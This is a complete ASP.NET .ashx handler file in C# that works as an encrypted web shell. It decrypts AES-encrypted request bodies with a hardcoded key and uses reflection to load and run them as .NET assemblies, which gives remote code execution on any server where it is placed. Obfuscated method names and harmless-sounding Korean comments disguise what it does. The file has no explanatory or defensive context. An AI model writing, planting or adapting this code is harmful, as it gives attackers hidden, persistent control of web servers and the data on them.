<%@ WebHandler Language="C#" Class="Entry_X9" %>
using System;using System.Web;using System.Reflection;
// 배고파요, 치킨 먹고 싶다
public class Entry_X9:IHttpHandler{
    private byte[] GetKey_Y8(){
        // 오늘 날씨가 좋네요
        string hexKey = "63613633343537353338623962316530";
        int len = hexKey.Length;
        byte[] bytes = new byte[len / 2];
        for (int i=0; i < len; i += 2)
            bytes[i/2] = Convert.ToByte(hexKey.Substring(i, 2), 16);
        return bytes;
    }
    private byte[] Decrypt_Z7(byte[] data, byte[] key){
        // 안녕하세요
        var crypto = new System.Security.Cryptography.RijndaelManaged();
        return crypto.CreateDecryptor(key, key).TransformFinalBlock(data, 0, data.Length);
    }
    private void Execute_A6(byte[] payload, HttpContext ctx){
        string[] parts = new string[] { "Load", "K" };
        var asmType = typeof(Assembly);
        var method = asmType.GetMethod(parts[0], new Type[]{typeof(byte[])});
        var assembly = (Assembly)method.Invoke(null, new object[]{payload});
        assembly.CreateInstance(parts[1]).Equals(ctx);
    }
    public void ProcessRequest(HttpContext c_b5){
        // 커피 한잔 할래요?
        if(c_b5.Request.Cookies.Count!=0){
            var key = GetKey_Y8();
            var data = new byte[c_b5.Request.ContentLength];
            c_b5.Request.InputStream.Read(data, 0, data.Length);
            var payload = Decrypt_Z7(data, key);
            Execute_A6(payload, c_b5);
        };
    }
    public bool IsReusable{get{return false;}}
}